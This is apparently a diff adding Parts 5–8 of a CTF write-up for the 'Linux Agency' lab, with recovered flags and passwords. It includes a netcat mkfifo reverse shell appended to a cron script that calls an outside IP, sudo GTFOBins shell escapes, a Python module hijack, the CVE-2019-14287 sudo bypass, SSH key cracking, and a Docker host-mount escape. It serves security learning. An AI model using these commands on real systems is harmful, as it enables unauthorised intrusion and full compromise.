@@ -276,3 +276,347 @@ python3 flag.py
 | Mission 19 | mission18    | Ruby Script Execution (ruby flag.rb)               | mission19{a0bf41f56b3ac622d808f7a4385254b7} | 
 | Mission 20 | mission19    | C Source Compilation & Binary Run (gcc / ./flag)   | mission20{b0482f9e90c8ad2421bf4353cd8eae1c} | 
 | Mission 21 | mission20    | Python 3 Script Execution (python3 flag.py)        | mission21{7de756aabc528b446f6eb38419318f0c} | 
+
+## Executive Summary
+This report documents Part 5 of the penetration testing engagement on Linux Agency. Operations progressed from user ```mission21``` through ```mission28```, employing environment variable manipulation, local HTTP service enumeration, binary library trace (```ltrace```) analysis, wildcards/globbing parameter expansion, file metadata analysis, and string reversal to retrieve flags for Missions 22 through 29.
+
+## 1. Lateral Movement & Flag Progression Chain
+Phase 1: User ```mission21``` $\rightarrow$ ```mission22```
+1. Authenticated as ```mission21``` and inspected environment variables:
+```bash
+echo $SHELL
+```
+2. Spawned a full Bash session to properly interact with user sessions:
+```bash
+bash
+```
+3. Extracted the SSH password for ```mission22``` from the environment configuration.
+4. Mission 22 Flag: ```mission22{24caa74eb0889ed6a2e6984b42d49aaf}```
+
+Phase 2: User ```mission22``` $\rightarrow$ ```mission23```
+1. Authenticated as ```mission22``` via ```su mission22```, spawned a PTY shell using Python, and navigated to ```/home/mission22```:
+```bash
+python3 -c "import pty; pty.spawn('/bin/bash')"
+cd ~
+ls -la
+```
+2. Read ```flag.txt``` located in the home directory:
+```bash
+cat flag.txt
+```
+3. Mission 23 Flag: ```mission23{3710b9cb185282e3f61d2fd8b1b4ffea}```
+
+Phase 3: User ```mission23``` $\rightarrow$ ```mission24```
+1. Authenticated as ```mission23``` and read ```message.txt```:
+```bash
+cat message.txt
+# Prompted: "The hosts will help you."
+```
+2. Inspected ```/etc/hosts``` and discovered a local vhost entry pointing to ```mission24.com```:
+```bash
+cat /etc/hosts
+# 127.0.0.1 localhost linuxagency mission24.com
+```
+3. Executed an HTTP request to the local domain using ```curl```:
+```bash
+curl http://mission24.com | grep mission24
+```
+4. Mission 24 Flag: ```mission24{dbaeb06591a7fd6230407df3a947b89c}```
+
+Phase 4: User ```mission24``` $\rightarrow$ ```mission25```
+1. Authenticated as ```mission24``` and identified a local ELF binary named ```bribe```.
+2. Traced library function calls using ```ltrace``` to analyze environmental conditions:
+```bash
+ltrace ./bribe
+# Binary calls getenv("pocket") and compares it against "money" using strncmp()
+```
+3. Exported the required variable pocket with value money and executed the binary:
+```bash
+export pocket=money
+./bribe
+```
+4. Mission 25 Flag: ```mission25{61b93637881c87c71f220033b22a921b}```
+
+Phase 5: User ```mission25``` $\rightarrow$ ```mission26```
+1. Authenticated as ```mission25```. Traditional commands such as ```ls``` were restricted or unavailable in the home directory context.
+2. Executed a shell parameter expansion to output file contents matching hidden paths without standard ```ls/cat``` utility reliance:
+```bash
+printf %s $(<*)
+```
+3. Mission 26 Flag: ```mission26{cb6ce977c16c57f509e9f8462a120f00}```
+
+Phase 6: User ```mission26``` $\rightarrow$ ```mission27```
+1. Authenticated as ```mission26``` and listed directory contents containing ```flag.jpg```.
+2. Inspected file metadata using the ```file``` command:
+```bash
+file flag.jpg
+```
+3. Retrieved the flag embedded directly inside the JPEG header EXIF comment field.
+4. Mission 27 Flag: ```mission27{444d29b932124a48e7dddc0595788f4d}```
+
+Phase 7: User ```mission27``` $\rightarrow$ ```mission28```
+1. Authenticated as ```mission27``` and located an archive file with multiple chained extensions (```flag.mp3.mp4.exe...gz```).
+2. Decompressed the .gz layer using gunzip and inspected printable characters via ```strings```:
+```bash
+gunzip flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
+strings flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
+```
+3. Mission 28 Flag: ```mission28{03556f8ca983ef4dc26d2055aef9770f}```
+
+Phase 8: User ```mission28``` $\rightarrow$ ```mission29```
+1. Authenticated as ```mission28``` and listed files in ```/home/mission28```.
+2. Located ```txt.galf``` and read its content:
+```bash
+cat txt.galf
+# Output: }1fff2ad47eb52e68523621b8d50b2918{92noissim
+```
+3. Reversed the character string to construct the full flag:
+```bash
+echo "}1fff2ad47eb52e68523621b8d50b2918{92noissim" | rev
+```
+4. Mission 29 Flag: ```mission29{8192b05d8b12632586e25be74da2fff1}```
+
+## 2. Summary of Captured Flags (Part 5)
+
+| Mission      | User Context   | Extraction / Privilege Escalation Method                   | Flag Value                                   |
+|:--           |:--             |:--                                                         |:--                                           |
+| Mission 22   | mission21      | Interactive Shell Spawn & Env Extraction                   | mission22{24caa74eb0889ed6a2e6984b42d49aaf}  |
+| Mission 23   | mission22      | Python PTY Spawn & Direct File Read (cat flag.txt)         | mission23{3710b9cb185282e3f61d2fd8b1b4ffea}  |
+| Mission 24   | mission23      | Host file discovery & Local Vhost HTTP Query (curl)        | mission24{dbaeb06591a7fd6230407df3a947b89c}  |
+| Mission 25   | mission24      | Binary Reverse Engineering (ltrace) & export pocket=money  | mission25{61b93637881c87c71f220033b22a921b}  |
+| Mission 26   | mission25      | Wildcard Expansion (printf %s $(<*))                       | mission26{cb6ce977c16c57f509e9f8462a120f00}  |
+| Mission 27   | mission26      | Image Comment Metadata Extraction (file flag.jpg)          | mission27{444d29b932124a48e7dddc0595788f4d}  |
+| Mission 28   | mission27      | Gzip Extraction & String Parsing (gunzip / strings)        | mission28{03556f8ca983ef4dc26d2055aef9770f}  |
+| Mission 29   | mission28      | File Reading & String Reversal (cat txt.galf | rev)        | mission29{8192b05d8b12632586e25be74da2fff1}  |
+
+## Executive Summary (Part 6)
+This report documents Part 6 of the penetration testing engagement on Linux Agency. Operations progressed from user ```mission28``` through ```jordan``` (user ```reza```), employing string reversal, pattern searching in web configurations, Git repository commit history inspection, crontab manipulation, Sudo GTFOBins exploitation (```zip```, ```git```), and Python module hijacking to retrieve flags for Missions 29 through 34.
+
+## 1. Lateral Movement & Flag Progression Chain
+Phase 1: User ```mission28``` $\rightarrow$ ```mission29```
+1. Authenticated as ```mission28``` and listed files in ```/home/mission28```.
+2. Located ```txt.galf``` and read its content:
+```bash
+cat txt.galf
+# Output: }1fff2ad47eb52e68523621b8d50b2918{92noissim
+```
+3. Reversed the character string to construct the full flag:
+```bash
+cat txt.galf | rev
+```
+4. Mission 29 Flag: ```mission29{8192b05d8b12632586e25be74da2fff1}```
+
+Phase 2: User ```mission29``` $\rightarrow$ ```mission30```
+1. Authenticated as ```mission29``` and navigated to the ```bludit``` web application directory (```/home/mission29/bludit```).
+2. Executed a recursive string search across hidden files for flag patterns:
+```bash
+cat .* | grep mission30
+```
+3. Located the flag embedded within the ```.htaccess``` server configuration file.
+4. Mission 30 Flag: ```mission30{d25b4c9fac38411d2fcb4796171bda6e}```
+
+Phase 3: User ```mission30``` $\rightarrow$ ```viktor```
+1. Authenticated as ```mission30``` and navigated to ```/home/mission30/Escalator```.
+2. Discovered a ```.git``` version control repository and inspected commit history:
+```bash
+cd Escalator/.git
+git log
+```
+3. Recovered an earlier commit message containing credentials for user ```viktor```.
+4. Viktor Flag / Credential: ```viktor{b52c60124c0f8f85fe647021122b3d9a}```
+
+Phase 4: User ```viktor``` $\rightarrow$ ```dalia```
+1. Authenticated as ```viktor``` via su ```viktor``` and checked crontab schedules:
+```bash
+cat /etc/crontab
+```
+2. Identified a cron job running as ```dalia``` that regularly executes ```/opt/scripts/47.sh```.
+3. Appended a Netcat reverse shell payload to ```/opt/scripts/47.sh```:
+```bash
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.135.130 1234 >/tmp/f" >> /opt/scripts/47.sh
+```
+4. Set up a listener on Kali (```nc -lvnp 1234```) to catch the incoming connection from ```dalia``` and read ```flag.txt```.
+5. Dalia Flag: ```dalia{4a94a7a7bb4a819a63a33979926c77dc}```
+
+Phase 5: User ```dalia``` $\rightarrow$ ```silvio```
+1. Authenticated as ```dalia``` and checked Sudo privileges:
+```bash
+sudo -l
+# Matching entry: (silvio) NOPASSWD: /usr/bin/zip
+```
+2. Exploited the Sudo ```zip``` GTFOBin privilege escalation vector to run a subshell as ```silvio```:
+```bash
+TF=$(mktemp -u)
+sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
+```
+3. Navigated to ```/home/silvio``` and retrieved ```flag.txt```:
+```bash
+cat flag.txt
+```
+4. Silvio Flag: ```silvio{657b4d058c03ab9988875bc937f9c2ef}```
+
+Phase 6: User ```silvio``` $\rightarrow$ ```reza```
+1. Authenticated as ```silvio``` and checked Sudo privileges:
+```bash
+sudo -l
+# Matching entry: (reza) SETENV: NOPASSWD: /usr/bin/git
+```
+2. Exploited ```git``` pager execution via Sudo to break out into a shell as ```reza```:
+```bash
+sudo -u reza PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
+```
+3. Navigated to ```/home/reza``` and read ```flag.txt```:
+```bash
+cat flag.txt
+```
+4. Reza Flag: ```reza{2f1901644eda75306f3142d837b80d3e}```
+
+Phase 7: User ```reza``` $\rightarrow$ ```jordan```
+1. Authenticated as ```reza``` and checked Sudo privileges:
+```bash
+sudo -l
+# Matching entry: (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
+```
+2. Analyzed ```/opt/scripts/Gun-Shop.py``` and identified a Python module hijack vulnerability (importing a module from the current working directory).
+3. Prepared a malicious local Python script inside /tmp/shop to hijack execution when invoking Sudo with ```PYTHONPATH``` or directory execution context.
+
+## 2. Summary of Captured Flags (Part 6)
+
+| User / Context  | Privilege Escalation Vector                       | Flag / Credential Value                     |
+|:--              |:--                                                |:--                                          |
+| Mission 29      | Direct File Reading & String Reversal (rev)       | mission29{8192b05d8b12632586e25be74da2fff1} |
+| Mission 30      | Hidden Web Config Parsing (.htaccess)             | mission30{d25b4c9fac38411d2fcb4796171bda6e} |
+| Viktor          | Git Repository Commit History Analysis (git log)  | viktor{b52c60124c0f8f85fe647021122b3d9a}    |
+| Dalia           | Crontab Shell Script Hijack (/opt/scripts/47.sh)  | dalia{4a94a7a7bb4a819a63a33979926c77dc}     |
+| Silvio          | Sudo GTFOBins Execution (sudo -u silvio zip)      | silvio{657b4d058c03ab9988875bc937f9c2ef}    |
+| Reza            | Sudo GTFOBins Pager Execution (sudo -u reza git)  | reza{2f1901644eda75306f3142d837b80d3e}      | 
+
+## Executive Summary (Part 7)
+This report documents Part 7 of the penetration testing assessment for Linux Agency. Operations progressed from user ```reza``` through ```maya``` by exploiting local Python library hijacking (```PYTHONPATH```), Sudo binary abuses (```less, vim```), SUID binary inspection, Base64 decoding from system logs, and targeted SSH key enumeration.
+
+## 1. Privilege Escalation & Lateral Movement Path
+Phase 1: User ```reza``` $\rightarrow$ ```jordan```
+1. Module Hijacking: Created a malicious ```shop.py``` script containing a payload to invoke a root-equivalent subshell:
+```bash
+import os
+os.system("/bin/bash")
+```
+2. Execution: Ran the Sudo script as ```jordan``` while specifying ```PYTHONPATH=/tmp/shop/``` to hijack python execution:
+```bash
+sudo -u jordan PYTHONPATH=/tmp/shop/ /opt/scripts/Gun-Shop.py
+```
+3. Flag Recovery: Navigated to ```/home/jordan``` and read ```flag.txt```:
+```bash
+cat flag.txt | rev
+```
+4. Jordan Flag: ```jordan{fcbc4b3c31c9b58289b3946978f9e3c3}```
+
+Phase 2: User ```jordan``` $\rightarrow$ ```ken```
+1. Sudo Enumeration: Checked Sudo permissions for ```jordan```:
+```bash
+sudo -l
+# Matching entry: (ken) NOPASSWD: /usr/bin/less
+```
+2. Escalation: Exploited the ```less``` GTFOBins breakout to execute ```/bin/bash``` under ```ken```:
+```bash
+sudo -u ken less /etc/profile
+# Inside less interface: !/bin/bash
+```
+3. Flag Recovery: Navigated to ```/home/ken``` and read ```flag.txt```.
+4. Ken Flag: ```ken{4115bf456d1aaf012ed4550c418ba99f}```
+
+Phase 3: User ```ken``` $\rightarrow$ ```sean```
+1. Sudo Enumeration: Checked Sudo permissions for ```ken```:
+```bash
+sudo -l
+# Matching entry: (sean) NOPASSWD: /usr/bin/vim
+```
+2. Escalation: Invoked ```vim``` via Sudo to break out into a subshell:
+```bash
+sudo -u sean vim -c ':!/bin/sh'
+```
+3. Flag Recovery & Log Inspection: Inspected ```/var/log/syslog.bak``` for sensitive entries belonging to ```sean```:
+```bash
+cat /var/log/syslog.bak | grep sean
+```
+4. Sean Flag: ```sean{4c5685f4db7966a43cf8e95859801281}```
+
+Phase 4: User sean $\rightarrow$ penelope
+1. Credential Recovery: Discovered an encoded Base64 string appended inside ```/var/log/syslog.bak```:
+```bash
+echo 'VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHA3bmVsb3BlCg==' | base64 --decode
+# Decoded Output: The password of penelope is p3nelope
+```
+2. Authentication: Authenticated as ```penelope``` using ```su penelope```.
+3. Flag Recovery: Read ```flag.txt``` inside ```/home/penelope```.
+4. Penelope Flag: ```penelope{2da1c2e9d2bd0004556ae9e107c1d222}```
+
+Phase 5: User penelope $\rightarrow$ maya
+1. SUID Binary Inspection: Identified a custom SUID binary named ```base64``` located in ```/home/penelope``` owned by ```maya```.
+2. Privilege Exploitation: Used the custom SUID binary to read ```/home/maya/flag.txt``` and piping through base64 decoding:
+```bash
+./base64 "/home/maya/flag.txt" | base64 --decode
+```
+3. Maya Flag: ```maya{a66e159374b98f64f89f7c8d458ebb2b}```
+4. Artifact Discovery: Switching context to maya via credentials, enumerated ```/home/maya/old_robert_ssh``` and located an encrypted RSA Private Key (```id_rsa```).
+
+## 2. Part 7 Captured Flags Summary
+
+| Target User  | Primary Escalation Vector                        | Flag Value                                 |
+|:--           |:--                                               |:--                                         |
+| jordan       | Python Module Hijacking (PYTHONPATH=/tmp/shop/)  | jordan{fcbc4b3c31c9b58289b3946978f9e3c3}   | 
+| ken          | Sudo GTFOBins (less Shell Escape)                | ken{4115bf456d1aaf012ed4550c418ba99f}      | 
+| sean         | Sudo GTFOBins (vim Shell Escape)                 | sean{4c5685f4db7966a43cf8e95859801281}     | 
+| penelope     | Decoded Base64 Log Leak (p3nelope)               | penelope{2da1c2e9d2bd0004556ae9e107c1d222} |
+| maya         | Custom SUID Binary Abuse (./base64)              | maya{a66e159374b98f64f89f7c8d458ebb2b}     |
+
+## Executive Summary (Part 8)
+This final report details Part 8 of the Linux Agency penetration testing engagement. Operations progressed from obtaining encrypted SSH credentials for ```robert```, exploiting a containerized environment via SSH forwarding and Sudo security bypasses, and leveraging Docker host filesystem mounting to achieve full host system compromise and retrieve the final root flag.
+
+## 1. Execution Path & Exploitation Details
+Phase 1: SSH Private Key Cracking & Forwarding (```robert```)
+1. Passphrase Cracking: Extracted the SSH private key from ```/home/maya/old_robert_ssh/id_rsa``` and converted it to a crackable hash format:
+```bash
+/usr/share/john/ssh2john.py id_rsa > hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+```
+- Recovered Passphrase: ```industryweapon```
+
+2. Port Discovery: Evaluated open listening ports using ```ss -lutpw``` and identified an internal SSH service bound to ```127.0.0.1:2222```.
+3. SSH Access: Authenticated as user ```robert``` on port 2222:
+```bash
+ssh robert@127.0.0.1 -p 2222
+```
+Phase 2: Sudo Vulnerability Exploitation (CVE-2019-14287)
+1. Privilege Enumeration: Checked Sudo configuration for ```robert```:
+```bash
+sudo -l
+# Entry: (ALL, !root) NOPASSWD: /bin/bash
+```
+2. Exploitation: Leveraged the Sudo user ID specification vulnerability (CVE-2019-14287) by passing ID ```-1``` (or ```4294967295```) to bypass explicit root restrictions and spawn a root shell:
+```bash
+sudo -u#-1 /bin/bash
+```
+3. Container Root Flag Recovery: Navigated to ```/root``` and read ```user.txt```:
+- User Flag: ```user{620fb94d32470e1e9dcf8926481efc96}```
+- Message File (```success.txt```): Directed the operator to breach the outer container environment back to the main host.
+
+Phase 3: Docker Host Escape to Full System Root
+1. Container Enumeration: Checked ```/tmp``` for binaries and identified a standalone ```./docker``` binary socket client.
+2. Container Inspection: Listed active Docker containers:
+```bash
+./docker ps -a
+```
+3. Host Filesystem Mount: Ran a privileged Docker container mapping the root directory of the host host system (```/```) to ```/mnt``` inside a new container instance:
+```bash
+./docker run -v /:/mnt --rm -it mangoman chroot /mnt sh
+```
+4. Root Flag Recovery: Spawned ```bash```, navigated to ```/root```, and read ```root.txt```.
+
+## 2. Part 8 Summary of Findings & Flags
+
+| Target / Context  | Vector / Vulnerability                              | Flag / Credential Value                |
+| :--               | :--                                                 | :--                                    |
+| Robert SSH        | Key Passphrase Crack (john / rockyou.txt)           | industryweapon                         |
+| Container Root    | Sudo User ID Specification Bypass (CVE-2019-14287)  | user{620fb94d32470e1e9dcf8926481efc96} |
+| Host Root System  | Docker Socket Abuse & Host Root Mount (-v /:/mnt)   | root{62ca2110ce7df377872dd9f0797f8476} |
